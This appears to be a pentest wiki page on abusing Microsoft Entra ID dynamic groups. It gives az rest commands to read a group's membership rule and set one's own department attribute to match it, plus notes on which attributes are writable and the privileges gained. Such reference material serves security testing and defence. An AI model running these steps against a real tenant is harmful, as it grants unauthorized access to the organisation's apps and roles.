---
title: "Dynamic membership: matching a group's rule to join it"
description: "Injecting yourself into a dynamic security group by setting the user attribute its membership rule matches, inheriting the group's access and roles."
keywords:
  - dynamic membership
  - dynamic groups
  - membership rule
  - attribute injection
  - access
---

# Dynamic membership

A dynamic group recomputes its members from a rule over user attributes (for example `user.department -eq "IT"`). If you can edit an attribute the rule reads, on your own account or one you control, you make yourself match and Entra adds you automatically, inheriting whatever the group grants.

## Match the rule

```bash
# read a dynamic group's membership rule
az rest --method GET --url "https://graph.microsoft.com/v1.0/groups/<group>?\$select=membershipRule,groupTypes"

# set the matching attribute on a user you can edit (needs the right to write that attribute)
az rest --method PATCH --url "https://graph.microsoft.com/v1.0/users/<you>" \
  --body '{"department":"IT"}'
```

## Exploitation notes

- Self-service-editable attributes (job title, department in some tenants) are the opening; writable attributes vary by tenant and role.
- Membership recomputes asynchronously, so there is a short delay before access lands.
- Dynamic groups often back app and license assignment and sometimes role-assignable groups, so the inherited access can be significant.

## Tools

- **az cli** / **Graph** (`groups` membershipRule, `users` PATCH).
- **ROADtools** / **AzureHound**: dynamic-group rules and effects.

## References

- [HackTricks Cloud: dynamic groups](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [SpecterOps: AzureHound](https://github.com/BloodHoundAD/AzureHound)
- [Microsoft: dynamic membership rules](https://learn.microsoft.com/entra/identity/users/groups-dynamic-membership)
